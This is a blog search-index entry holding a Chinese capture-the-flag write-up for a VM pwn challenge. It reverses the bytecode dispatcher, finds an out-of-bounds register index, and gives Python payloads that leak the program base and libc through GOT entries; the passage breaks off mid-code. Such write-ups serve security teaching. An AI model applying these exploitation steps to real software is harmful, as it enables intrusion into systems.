<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>virtual_machine-UCATFLAGS2024-writeup</title>
    <link href="/2024/12/11/virtual-machine-UCATFLAGS2024-wp/"/>
    <url>/2024/12/11/virtual-machine-UCATFLAGS2024-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="virtual-machine">virtual machine</h1><p>其实感觉本题的难点在于逆向（</p><h2 id="预分析">预分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">checksec vm<br></code></pre></td></tr></table></figure><p>返回 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Arch:     amd64-64-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      PIE enabled<br></code></pre></td></tr></table></figure></p><p>没有 <code>canary</code> ，<code>got</code>表可写，开启地址随机化保护。</p><p>运行一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">hello<br>and how to program?<br>---your code---<br>asas<br>---your code---<br>asasas<br>---your code---<br></code></pre></td></tr></table></figure><p>附件中还给了一个 <code>libc.so.6</code> 的动态链接库，用<code>strings</code> 查看其版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings libc.so.6 | grep ubuntu<br></code></pre></td></tr></table></figure><p>返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.16) stable release version 2.31.<br>&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.<br></code></pre></td></tr></table></figure><p>我们可以根据这个版本信息去搭建本地环境（当然，这不是刚需，尤其是你觉得不需要调试的时候）。搭建这个环境的作用是使得各函数在<code>libc</code> 库中的<strong>偏移</strong>与服务端一致。</p><p>配置本地调试环境大家可以自行查询，关键词：<code>glibc-all-in-one</code> <code>patchelf</code></p><p>接下来使用 <code>ida64</code> 进行分析</p><h2 id="逆向程序">逆向程序</h2><p>根据题目提示，这是一台虚拟机，也可以在ida函数界面看到一些像是汇编指令一样的函数名，如<code>jmp</code> <code>call</code> <code>push</code> 等。</p><p>观察 <code>main</code> 函数的主体部分，发现先是调用 <code>exec</code>函数，传入了两个字节流，下面又将我们的输入传给 <code>exec</code>函数，所以进入这个函数查看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 __fastcall <span class="hljs-title function_">exec</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">unsigned</span> __int8 a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 i; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i &lt;= <span class="hljs-number">7</span>; ++i )<br>    *(&amp;ra)[i] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;sysmm, <span class="hljs-number">0</span>, <span class="hljs-number">0x2B00</span>uLL);<br>  load_ftable();<br>  load_text(a1, a2);<br>  <span class="hljs-keyword">return</span> exec_text();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>a1</code> 由我们上面的分析，应该是要执行的命令的字符串，<code>a2</code> 现在还不知道，可以进入 <code>load_text</code> 查看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__fastcall <span class="hljs-title function_">load_text</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *a1, <span class="hljs-type">unsigned</span> __int8 a2)</span><br>&#123;<br>  <span class="hljs-type">void</span> *result; <span class="hljs-comment">// rax</span><br><br>  result = <span class="hljs-built_in">memcpy</span>(&amp;unk_7300, a1, a2);<br>  r6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现是将 <code>a1</code> copy 到 <code>&amp;unk_7300</code>，copy的字节数是 <code>a2</code> ，所以 <code>a2</code> 的含义应该是<code>a1</code> 的长度，<code>exec</code> 原型应是<code>exec(char* a1, uint8_t a2)</code> ，观察 <code>main</code>函数，发现其实没有关于此处的漏洞。</p><p><code>exec</code> 函数的前一部分是将一些东西初始化为0，主要分析后面三个函数 <code>load_ftable</code> <code>load_text</code><code>exec_text</code></p><p>下面是 <code>load_ftable</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 (__fastcall *load_ftable())()<br>&#123;<br>  __int64 (__fastcall *result)(); <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">memset</span>(&amp;unk_7400, <span class="hljs-number">0</span>, <span class="hljs-number">0x800</span>uLL);<br>  qword_7480 = (__int64)inc0;<br>  qword_7488 = (__int64)dec0;<br>  qword_7490 = (__int64)nop;<br>  qword_7498 = (__int64)ret;<br>  qword_7500 = (__int64)push;<br>  qword_7508 = (__int64)pop;<br>  qword_7530 = (__int64)nor;<br>  qword_7538 = (__int64)shl;<br>  qword_7540 = (__int64)pac;<br>  qword_7548 = (__int64)incr;<br>  qword_7550 = (__int64)decr;<br>  qword_7558 = (__int64)gac;<br>  qword_7600 = (__int64)add;<br>  qword_7608 = (__int64)or;<br>  qword_7610 = (__int64)xor;<br>  qword_7618 = (__int64)movrr;<br>  qword_7620 = (__int64)movmtr;<br>  qword_7628 = (__int64)movrtm;<br>  qword_7630 = (__int64)cmpl;<br>  qword_7638 = (__int64)cmps;<br>  qword_7640 = (__int64)cmpe;<br>  qword_7648 = (__int64)sub;<br>  qword_7700 = (__int64)ldr;<br>  qword_7800 = (__int64)call;<br>  qword_7808 = (__int64)jne;<br>  qword_7810 = (__int64)jns;<br>  qword_7818 = (__int64)jnl;<br>  qword_7820 = (__int64)jmp;<br>  qword_7828 = (__int64)jl;<br>  qword_7830 = (__int64)js;<br>  result = je;<br>  qword_7838 = (__int64)je;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>load_ftable</code> 函数将一些函数地址写入了 <code>bss</code>段的变量里。这些函数的功能在这里就不赘述了，主要是实现一些类似汇编指令的功能。从这些函数的分析中，我们可以看到一些被经常使用的变量，如<code>r6</code>，而且它自增的值似乎与<strong>函数的参数个数</strong>有关，可以推测其功能应该类似于<code>eip</code> 寄存器。</p><p><code>load_text</code> 只是进行了一个拷贝。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__fastcall <span class="hljs-title function_">load_text</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *a1, <span class="hljs-type">unsigned</span> __int8 a2)</span><br>&#123;<br>  <span class="hljs-type">void</span> *result; <span class="hljs-comment">// rax</span><br><br>  result = <span class="hljs-built_in">memcpy</span>(&amp;byte_7300, a1, a2);<br>  r6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是 <code>exec_text</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">exec_text</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = *(_QWORD *)&amp;sysmm[<span class="hljs-number">4</span> * (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] + <span class="hljs-number">4480</span>];<br>    <span class="hljs-keyword">if</span> ( !result )<br>      <span class="hljs-keyword">break</span>;<br>    result = (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6];<br>    <span class="hljs-keyword">if</span> ( !(_BYTE)result || i == <span class="hljs-number">512</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] &lt;= <span class="hljs-number">0xF</span>u<br>      || (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] &gt; <span class="hljs-number">0x1F</span>u )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] &lt;= <span class="hljs-number">0x1F</span>u<br>        || (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] &gt; <span class="hljs-number">0x3F</span>u )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] &lt;= <span class="hljs-number">0x3F</span>u<br>          || (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] &gt; <span class="hljs-number">0x5F</span>u )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] &lt; <span class="hljs-number">96</span> )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] &lt;= <span class="hljs-number">-113</span> )<br>              (*(<span class="hljs-type">void</span> (__fastcall **)(_QWORD))&amp;sysmm[<span class="hljs-number">4</span> * (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] + <span class="hljs-number">4480</span>])((<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">1</span>]);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            (*(<span class="hljs-type">void</span> (__fastcall **)(__int16 *, _QWORD))&amp;sysmm[<span class="hljs-number">4</span> * (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6]<br>                                                            + <span class="hljs-number">4480</span>])(<br>              (&amp;ra)[(<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">1</span>]],<br>              (<span class="hljs-type">unsigned</span> __int16)((<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">2</span>]<br>                               + ((<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">8</span>)));<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          (*(<span class="hljs-type">void</span> (__fastcall **)(__int16 *, __int16 *))&amp;sysmm[<span class="hljs-number">4</span> * (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6]<br>                                                             + <span class="hljs-number">4480</span>])(<br>            (&amp;ra)[(<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">1</span>]],<br>            (&amp;ra)[(<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">2</span>]]);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        (*(<span class="hljs-type">void</span> (__fastcall **)(__int16 *))&amp;sysmm[<span class="hljs-number">4</span> * (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] + <span class="hljs-number">4480</span>])((&amp;ra)[(<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">1</span>]]);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      (*(<span class="hljs-type">void</span> (**)(<span class="hljs-type">void</span>))&amp;sysmm[<span class="hljs-number">4</span> * (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6] + <span class="hljs-number">4480</span>])();<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>exec_text</code> 函数中可以发现一个经常出现的变量<code>byte_7300[(unsigned __int16)r6]</code> ，整个函数的大体含义是根据<code>byte_7300[(unsigned __int16)r6]</code> 的值，执行<code>&amp;sysmm[4 * (unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480])</code>处的函数，不同条件函数传入的参数不同。</p><p>那么这个函数指针与之前那么多函数有什么关系呢？</p><p><code>&amp;sysmm</code> 的类型是 <code>_WORD</code>，所以函数指针的地址应为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">sysmm_offset + ( 4 * (unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480 ) * 2<br></code></pre></td></tr></table></figure><p>其中 <code>sysmm</code> 的偏移为 <code>0x0000000000005100</code>，与后面相加为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">0x7400 + 8 * (unsigned __int8)byte_7300[(unsigned __int16)r6]<br></code></pre></td></tr></table></figure><p>这便是函数指针的地址。</p><p>至于 <code>byte_7300</code> ，可以从函数 <code>load_text</code>中看到，这是从我们的输入拷贝过来的，也就是说我们的输入决定了程序调用那个函数指针，而调用规则则由<code>load_ftable</code> 函数进行加载。而且，这更加印证了<code>r6</code> 相当于虚拟机的 <code>ip</code> 寄存器。</p><p>再分析这些函数调用的参数是什么。</p><p>发现与<code>(unsigned __int8)byte_7300[(unsigned __int16)r6] + 4480]</code>有如下对应关系（改写成c）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint8_t</span> one_byte = (<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6];<br><br><span class="hljs-keyword">if</span> (one_byte &gt;= <span class="hljs-number">0x10</span> &amp;&amp; one_byte &lt; <span class="hljs-number">0x20</span>) &#123;<br>    (*(<span class="hljs-type">void</span> (**)(<span class="hljs-type">void</span>))&amp;sysmm[<span class="hljs-number">4</span> * one_byte + <span class="hljs-number">4480</span>])();<br>    <span class="hljs-comment">// 参数：无</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (one_byte &gt;= <span class="hljs-number">0x20</span> &amp;&amp; one_byte &lt; <span class="hljs-number">0x40</span>) &#123;<br>    (*(<span class="hljs-type">void</span> (__fastcall **)(__int16 *))&amp;sysmm[<span class="hljs-number">4</span> * one_byte + <span class="hljs-number">4480</span>])((&amp;ra)[(<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">1</span>]]);<br>    <span class="hljs-comment">// 参数：one_byte 的下一个子节作为索引，在ra数组中的值，被解释为一个int16指针</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (one_byte &gt;= <span class="hljs-number">0x40</span> &amp;&amp; one_byte &lt; <span class="hljs-number">0x60</span>) &#123;<br>    (*(<span class="hljs-type">void</span> (__fastcall **)(__int16 *, __int16 *))&amp;sysmm[<span class="hljs-number">4</span> * one_byte + <span class="hljs-number">4480</span>])(<br>        (&amp;ra)[(<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">1</span>]],<br>        (&amp;ra)[(<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">2</span>]]<br>    );<br>    <span class="hljs-comment">// 参数：one_byte 的下一个字节和再下一个字节为索引，在ra数组中的值，被解释为一个int16指针</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (one_byte &gt;= <span class="hljs-number">0x60</span> &amp;&amp; one_byte &lt; <span class="hljs-number">0x80</span>) &#123;<br>    (*(<span class="hljs-type">void</span> (__fastcall **)(__int16 *, _QWORD))&amp;sysmm[<span class="hljs-number">4</span> * one_byte + <span class="hljs-number">4480</span>])(<br>        (&amp;ra)[(<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">1</span>]],<br>        (<span class="hljs-type">unsigned</span> __int16)((<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">2</span>] + ((<span class="hljs-type">unsigned</span> __int8)byte_7300[(unsigned__int16)r6 + <span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">8</span>))<br>    );<br>    <span class="hljs-comment">// 参数：1. one_byte 的下一个子节作为索引，在ra数组中的值，被解释为一个int16指针</span><br>    <span class="hljs-comment">//       2. one_byte 下第二、第三个字节分别作为低位和高位拼接成的一个 int16类型的整数</span><br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (one_byte &gt;= <span class="hljs-number">0x80</span> &amp;&amp; one_byte &lt; <span class="hljs-number">0x90</span>) <span class="hljs-comment">/*此处注意char类型的正负*/</span>&#123;<br>    (*(<span class="hljs-type">void</span> (__fastcall **)(_QWORD))&amp;sysmm[<span class="hljs-number">4</span> * one_byte + <span class="hljs-number">4480</span>])((<span class="hljs-type">unsigned</span> __int8)byte_7300[(<span class="hljs-type">unsigned</span> __int16)r6 + <span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">//参数：直接传入 one_byte 的下一个字节作为参数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里，我们其实可以结合前面的函数注意到，<code>ra</code>实际上是一个指针数组，其内部储存着 <code>r0 ~ r7</code>的地址。所以这里（<code>(&amp;ra)[(unsigned __int8)byte_7300[(unsigned __int16)r6 + 1]]</code>）其实存在一个<strong>数组越界漏洞</strong>，即我们的输入值可以大于<code>ra</code> 的最大索引 <code>7</code> ，从而实现一些事情。</p><h2 id="漏洞利用">漏洞利用</h2><p>首先，这个程序依据我们的输入，调用不同的函数指针，执行不同的代码，那么我们可以通过更改或向对应位置写入函数指针再通过输入调用该函数，便可实现函数的执行。</p><p>然后，我们要想利用 <code>libc</code> 中的 <code>system</code>函数，需要泄露程序的 <code>libc</code> 基址，这就需要我们泄露<code>got</code> 表中的值，但由于地址随机化，我们要想知道<code>got</code>表的地址，就需要知道程序加载的基址。显然的，<code>bss</code>段上已经有一些已储存的函数指针，他们都指向 <code>text</code>段，可以泄露程序基址。（使用函数<code>pac</code>，它能打印依据<code>sysmm</code> 偏移的字节）</p><p>于是我们可以像编写汇编代码一样编写本虚拟机的代码。下面附上各函数的<strong>指令</strong>如下（即上面的<code>one_byte</code> 值）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plain">0x10    inc0;<br>0x11    dec0;<br>0x12    nop;<br>0x13    ret;<br>0x20    push;<br>0x21    pop;<br>0x26    nor;<br>0x27    shl;<br>0x28    pac;<br>0x29    incr;<br>0x2a    decr;<br>0x2b    gac;<br>0x40    add;<br>0x41    or;<br>0x42    xor;<br>0x43    movrr;<br>0x44    movmtr;<br>0x45    movrtm;<br>0x46    cmpl;<br>0x47    cmps;<br>0x48    cmpe;<br>0x49    sub;<br>0x60    ldr;<br>0x80    call;<br>0x81    jne;<br>0x82    jns;<br>0x83    jnl;<br>0x84    jmp;<br>0x85    jl;<br>0x86    js;<br>0x87    je;<br></code></pre></td></tr></table></figure><p>于是，我们可以编写代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1=<span class="hljs-string">b&quot;&quot;</span><br>payload1+=<span class="hljs-string">b&quot;\x60\x00\x08\x00&quot;</span> <span class="hljs-comment"># ldr r0,0x0008</span><br>payload1+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+(nop_f_addr_r-sysmm_addr_r).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>) <span class="hljs-comment"># ldr r1, nop_offset</span><br>payload1+=<span class="hljs-string">b&quot;\x28\x01&quot;</span> <span class="hljs-comment"># pac, r1</span><br>payload1+=<span class="hljs-string">b&quot;\x29\x01&quot;</span> <span class="hljs-comment"># incr, r1</span><br>payload1+=<span class="hljs-string">b&quot;\x11&quot;</span> <span class="hljs-comment"># inc0</span><br>payload1+=<span class="hljs-string">b&quot;\x48\x00\x02&quot;</span> <span class="hljs-comment"># cmpe r0, r2  ; 此时r2为初始值，是0</span><br>payload1+=<span class="hljs-string">b&quot;\x81\x08&quot;</span> <span class="hljs-comment"># je 0x08</span><br></code></pre></td></tr></table></figure><p>上面代码通过循环实现了打印 <code>nop</code>这个函数指针，这个指针减去 <code>ida</code>中可以查看到的偏移即为程序基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2=<span class="hljs-string">b&quot;&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((puts_plt&amp;<span class="hljs-number">0xffff</span>)).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x60\x00&quot;</span>+(puts_f_addr_r-sysmm_addr_r).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span> <span class="hljs-comment"># movrtm r0, r1 ; 看清源操作数和目的操作数</span><br>payload2+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((puts_plt&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((puts_plt&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+(putchar_got&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x60\x00\x00\x00&quot;</span> <br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((putchar_got&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((putchar_got&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x2c&quot;</span>+((sysmm_addr_r-ra_addr_r)//<span class="hljs-number">8</span>).to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>) <span class="hljs-comment"># 利用了数组越界漏洞，打印了 ra[8]</span><br></code></pre></td></tr></table></figure><p>这段代码主要实现了将 <code>puts</code> 的 <code>plt</code>表地址复制到指令 <code>0x2c</code> 所对应的内存处，即程序中变量<code>puts_f_addr_r</code> ，再调用 <code>puts</code> 函数打印出<code>putchar</code> 的 <code>got</code> 表，从而泄露 <code>libc</code>基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 